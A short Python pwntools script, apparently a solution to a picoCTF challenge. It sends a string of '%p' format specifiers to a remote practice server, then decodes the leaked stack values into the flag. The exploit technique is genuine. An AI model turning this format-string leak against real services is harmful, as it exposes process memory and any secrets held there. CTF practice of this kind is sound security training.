from pwn import *

address = 'saturn.picoctf.net'
port = 60312

payload = b'%p' * 100
output = ''


with remote(address, port) as target:
        target.recvuntil(b'Tell me a story and then I\'ll tell you one >> ')
        target.sendline(payload)
        target.recvuntil(b'Here\'s a story - \n')
        output += target.recv(2048).decode()



strings = output.split('0x')

decodedStrings = []

for string in strings:
        newString = ''
        for i in range(0, len(string), 2):
                try:
                        newString += chr(int(string[i:i+2], 16))
                except Exception:
                        pass
        decodedStrings.append(newString[::-1])

strings = ''.join(decodedStrings)
flag = strings[strings.index('pico'):strings.index('}') + 1]
print(flag)
